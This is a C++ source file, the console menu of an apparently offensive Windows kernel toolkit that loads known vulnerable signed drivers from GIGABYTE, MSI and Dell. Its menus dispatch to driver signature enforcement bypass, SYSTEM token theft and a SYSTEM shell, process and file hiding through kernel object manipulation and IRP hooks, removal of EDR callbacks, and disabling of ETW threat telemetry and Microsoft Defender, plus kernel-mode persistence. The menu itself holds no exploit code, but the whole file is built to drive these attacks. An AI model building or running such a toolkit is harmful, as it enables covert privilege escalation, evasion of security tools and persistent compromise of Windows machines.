/**
 * @file PocMenu.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the PocMenu class.
 *
 * Implements the console menu interface, allowing the user to navigate
 * through options, select a vulnerable driver provider, and execute
 * kernel-level attacks and utilities.
 */

#include "PocMenu.h"
#include "Privilege.h"
#include "PEParser.h"
#include "DefenderDisabler.h"
#include "Persistence.h"
#include "Uninstaller.h"
#include "FileHider.h"
#include "Providers/GdrvProvider.h" // Include concrete providers
#include "Providers/RTCoreProvider.h"
#include "Providers/DBUtilProvider.h"
#include <iostream>
#include <limits>
#include <iomanip>

#ifdef max
#undef max
#endif

namespace KernelMode {

    PocMenu::PocMenu() = default;
    PocMenu::~PocMenu() {
        if (activeProvider) {
            activeProvider->Deinitialize();
        }
    }

    void PocMenu::DisplayBanner() {
        std::cout << "====================================================\n";
        std::cout << "         KernelMode - Advanced Windows Kernel Toolkit\n";
        std::cout << "                      Author: Gregory King\n";
        std::cout << "====================================================\n\n";
    }

    int PocMenu::GetUserChoice(int maxChoice) {
        int choice;
        std::cout << "> ";
        std::cin >> choice;

        if (std::cin.fail() || choice < 0 || choice > maxChoice) {
            std::cin.clear();
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            std::cout << "[-] Invalid choice. Please try again.\n";
            return -1;
        }
        // Clear potential leftover newline characters for getline
        if (std::cin.peek() == '\n') {
            std::cin.ignore();
        }
        return choice;
    }

    void PocMenu::SelectProvider() {
        if (activeProvider) {
            std::cout << "[!] A provider is already loaded. Deinitializing first.\n";
            activeProvider->Deinitialize();
            activeProvider.reset();
            dseManager.reset();
            processManager.reset();
            callbackManager.reset();
            manualMapper.reset();
            fileHider.reset();
            etwManager.reset();
        }

        std::cout << "\n--- Provider Selection ---\n";
        std::cout << "1. Gdrv (GIGABYTE gdrv.sys)\n";
        std::cout << "2. RTCore64 (Micro-Star RTCore64.sys)\n";
        std::cout << "3. DBUtil_2_3 (Dell DBUtil_2_3.sys)\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(3);

        switch (choice) {
        case 1:
            activeProvider = std::make_shared<Providers::GdrvProvider>();
            break;
        case 2:
            activeProvider = std::make_shared<Providers::RTCoreProvider>();
            break;
        case 3:
            activeProvider = std::make_shared<Providers::DBUtilProvider>();
            break;
        case 0:
            return; // Back
        default:
            std::cout << "[-] Invalid provider choice.\n";
            return;
        }

        if (activeProvider && !activeProvider->Initialize()) {
            std::cout << "[-] Failed to initialize the selected provider. Please ensure the driver is available and you are running as Administrator.\n";
            activeProvider.reset();
        }
        else if(activeProvider) {
            dseManager = std::make_unique<DSE>(activeProvider);
            processManager = std::make_unique<Process>(activeProvider);
            callbackManager = std::make_unique<Callbacks>(activeProvider);
            manualMapper = std::make_unique<ManualMapper>(activeProvider);
            fileHider = std::make_unique<FileHider>(activeProvider);
            etwManager = std::make_unique<ETW>(activeProvider);
            std::cout << "[+] Provider loaded successfully.\n";
        }
    }

    void PocMenu::ProviderActionsMenu() {
        if (!activeProvider) {
            std::cout << "\n[-] No provider loaded. Please select a provider first.\n";
            return;
        }

        bool running = true;
        while (running) {
            std::cout << "\n--- Provider Actions Menu ---\n";
            std::cout << "1. DSE Operations\n";
            std::cout << "2. Privilege Escalation\n";
            std::cout << "3. Process Hiding (DKOM)\n";
            std::cout << "4. AV/EDR Evasion\n";
            std::cout << "5. Manual Driver Mapping\n";
            std::cout << "6. Kernel-Mode Persistence\n";
            std::cout << "7. File Hiding (IRP Hook)\n";
            std::cout << "0. Back to Main Menu\n";

            int choice = GetUserChoice(7);

            switch (choice) {
            case 1: HandleDseBypass(); break;
            case 2: HandlePrivilegeEscalation(); break;
            case 3: HandleProcessHiding(); break;
            case 4: HandleAvEvasion(); break;
            case 5: HandleManualMap(); break;
            case 6: HandlePersistence(); break;
            case 7: HandleFileHiding(); break;
            case 0: running = false; break;
            default: break;
            }
        }
    }

    void PocMenu::HandleDseBypass() {
        if (!dseManager) {
            std::cout << "[-] DSE Manager not initialized.\n";
            return;
        }
        std::cout << "\n--- DSE Operations ---\n";
        std::cout << "1. Disable DSE (Patch g_CiOptions)\n";
        std::cout << "2. Restore DSE\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(2);
        switch (choice) {
        case 1: dseManager->Disable(); break;
        case 2: dseManager->Restore(); break;
        case 0: return;
        default: break;
        }
    }

    void PocMenu::HandlePrivilegeEscalation() {
        std::cout << "\n--- Privilege Escalation ---\n";
        std::cout << "1. Steal SYSTEM Token\n";
        std::cout << "2. Spawn SYSTEM Shell\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(2);
        switch (choice) {
        case 1:
            if (Privilege::StealSystemToken()) {
                std::cout << "[+] Current thread is now impersonating SYSTEM.\n";
            }
            else {
                std::cout << "[-] Failed to elevate to SYSTEM.\n";
            }
            break;
        case 2: Privilege::SpawnSystemShell(); break;
        case 0: return;
        default: break;
        }
    }

    void PocMenu::HandleProcessHiding() {
        if (!processManager) {
            std::cout << "[-] Process Manager not initialized.\n";
            return;
        }
        std::cout << "\n--- Process Hiding (DKOM) ---\n";
        std::cout << "Enter the PID of the process to hide: ";
        DWORD pid;
        std::cin >> pid;
        if (std::cin.fail()) {
            std::cin.clear();
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            std::cout << "[-] Invalid PID.\n";
            return;
        }

        processManager->HideProcess(pid);
    }

    void PocMenu::HandleAvEvasion() {
        std::cout << "\n--- AV/EDR Evasion ---\n";
        std::cout << "1. Unlink Kernel Callbacks\n";
        std::cout << "2. Disable ETW Threat Intelligence Provider\n";
        std::cout << "3. Disable Microsoft Defender (User-Mode)\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(3);
        switch (choice) {
            case 1: {
                if (!callbackManager) {
                    std::cout << "[-] Callback Manager not initialized. Please load a provider first.\n";
                    return;
                }
                std::cout << "\n--- Callback Unlinking ---\n";
                std::cout << "1. List Process Creation Callbacks\n";
                std::cout << "2. Remove Process Creation Callback\n";
                std::cout << "0. Back\n";

                int subChoice = GetUserChoice(2);
                switch (subChoice) {
                    case 1: {
                        auto callbacks = callbackManager->EnumerateProcessCallbacks();
                        std::cout << "[+] Found " << callbacks.size() << " process creation callbacks:\n";
                        for (const auto& addr : callbacks) {
                            std::cout << "    -> 0x" << std::hex << std::setw(16) << std::setfill('0') << addr << std::dec << std::endl;
                        }
                        break;
                    }
                    case 2: {
                        std::cout << "Enter the full callback address to remove (e.g., 0x...): ";
                        uintptr_t addr;
                        std::cin >> std::hex >> addr;
                        if (std::cin.fail()) {
                            std::cin.clear();
                            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                            std::cout << "[-] Invalid address.\n";
                            return;
                        }
                        callbackManager->RemoveProcessCallback(addr);
                        break;
                    }
                    case 0: return;
                    default: break;
                }
                break;
            }
            case 2:
                if (!etwManager) {
                    std::cout << "[-] ETW Manager not initialized. Please load a provider first.\n";
                    return;
                }
                etwManager->DisableThreatIntelligenceProvider();
                break;
            case 3:
                DefenderDisabler::Disable();
                break;
            case 0:
                return;
            default:
                break;
        }
    }

    void PocMenu::HandlePeParser() {
        std::cout << "\n--- PE Parser ---\n";
        std::cout << "Enter the full path to the driver/PE file: ";
        std::wstring filePath;
        std::getline(std::wcin, filePath);

        if (filePath.empty()) {
            std::cout << "[-] No file path entered.\n";
            return;
        }

        if (filePath.front() == L'"' && filePath.back() == L'"') {
            filePath = filePath.substr(1, filePath.length() - 2);
        }

        PEParser parser(filePath);
        if (parser.Parse()) {
            parser.DisplayHeaders();
        }
    }

    void PocMenu::HandleManualMap() {
        if (!manualMapper) {
            std::cout << "[-] Manual Mapper not initialized.\n";
            return;
        }
        std::cout << "\n--- Manual Driver Mapping ---\n";
        std::cout << "Enter the full path to the 64-bit driver to map: ";
        std::wstring filePath;
        std::getline(std::wcin, filePath);

        if (filePath.empty()) {
            std::cout << "[-] No file path entered.\n";
            return;
        }

        if (filePath.front() == L'"' && filePath.back() == L'"') {
            filePath = filePath.substr(1, filePath.length() - 2);
        }

        manualMapper->MapDriver(filePath);
    }

    void PocMenu::HandlePersistence() {
        if (!activeProvider) {
            std::cout << "[-] This feature requires an active provider.\n";
            return;
        }
        Persistence persistence(activeProvider);
        const std::wstring serviceName = L"KernelModeToolkitService";
        
        std::cout << "\n--- Kernel-Mode Persistence ---\n";
        std::cout << "This will attempt to create a new system service via kernel shellcode.\n";
        
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        persistence.CreateKernelService(serviceName, path);
    }

    void PocMenu::HandleFileHiding() {
        if (!fileHider) {
            std::cout << "[-] File Hider not initialized. Please load a provider first.\n";
            return;
        }
        std::cout << "\n--- File Hiding (IRP Hooking) ---\n";
        std::cout << "1. Hide File\n";
        std::cout << "2. Unhide File\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(2);
        switch (choice) {
            case 1: {
                std::cout << "Enter the exact file name to hide (e.g., secret.txt): ";
                std::wstring fileName;
                std::getline(std::wcin, fileName);
                if (!fileName.empty()) {
                    fileHider->HideFile(fileName);
                }
                break;
            }
            case 2:
                fileHider->UnhideFile();
                break;
            case 0:
                return;
            default:
                break;
        }
    }

    void PocMenu::HandleUninstaller() {
        std::cout << "\n--- Force Uninstaller ---\n";
        std::cout << "Enter the service name of the driver to uninstall: ";
        std::wstring serviceName;
        std::getline(std::wcin, serviceName);

        if (serviceName.empty()) {
            std::cout << "[-] No service name entered.\n";
            return;
        }

        Uninstaller::ForceUninstallDriver(serviceName);
    }

    void PocMenu::Run() {
        DisplayBanner();

        bool running = true;
        while (running) {
            std::cout << "\n--- Main Menu ---\n";
            std::cout << "Current Provider: ";
            if (activeProvider) {
                if (dynamic_cast<Providers::GdrvProvider*>(activeProvider.get())) {
                    std::cout << "Gdrv";
                } else if (dynamic_cast<Providers::RTCoreProvider*>(activeProvider.get())) {
                    std::cout << "RTCore64";
                } else if (dynamic_cast<Providers::DBUtilProvider*>(activeProvider.get())) {
                    std::cout << "DBUtil_2_3";
                }
                else {
                    std::cout << "Unknown";
                }
            } else {
                std::cout << "None";
            }
            std::cout << "\n\n";

            std::cout << "1. Select Provider\n";
            std::cout << "2. Provider Actions (Requires Provider)\n";
            std::cout << "3. Utilities\n";
            std::cout << "0. Exit\n";

            int choice = GetUserChoice(3);
            switch (choice) {
            case 1: SelectProvider(); break;
            case 2: ProviderActionsMenu(); break;
            case 3: 
                {
                    std::cout << "\n--- Utilities Menu ---\n";
                    std::cout << "1. PE Parser\n";
                    std::cout << "2. Force Uninstaller\n";
                    std::cout << "0. Back\n";
                    int utilChoice = GetUserChoice(2);
                    switch(utilChoice) {
                        case 1: HandlePeParser(); break;
                        case 2: HandleUninstaller(); break;
                        case 0: break;
                        default: break;
                    }
                }
                break;
            case 0: running = false; break;
            default: break;
            }
        }

        std::cout << "\nExiting. Cleaning up...\n";
    }
}